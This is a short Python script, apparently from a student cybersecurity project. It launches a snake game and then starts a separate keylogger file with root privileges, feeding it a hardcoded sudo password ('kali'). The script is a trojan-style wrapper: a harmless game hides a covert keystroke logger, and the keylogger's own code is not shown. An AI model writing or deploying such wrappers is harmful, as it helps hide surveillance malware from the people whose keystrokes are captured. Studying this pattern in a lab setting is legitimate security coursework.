import subprocess

# run snake 
subprocess.run(["python3", "snakeGame.py"])

# build terminal command to run keylogger
# sudo is needed for root privileges 
# -S makes terminal read from a standard input
command = ["sudo", "-S", "python3", "CSkeyloggerproject.py"]
try: 
    # runs command and waits for input
    process = subprocess.Popen(command, stdin=subprocess.PIPE, text = True)
    process.communicate(input="kali")
except:
    process.kill()



   
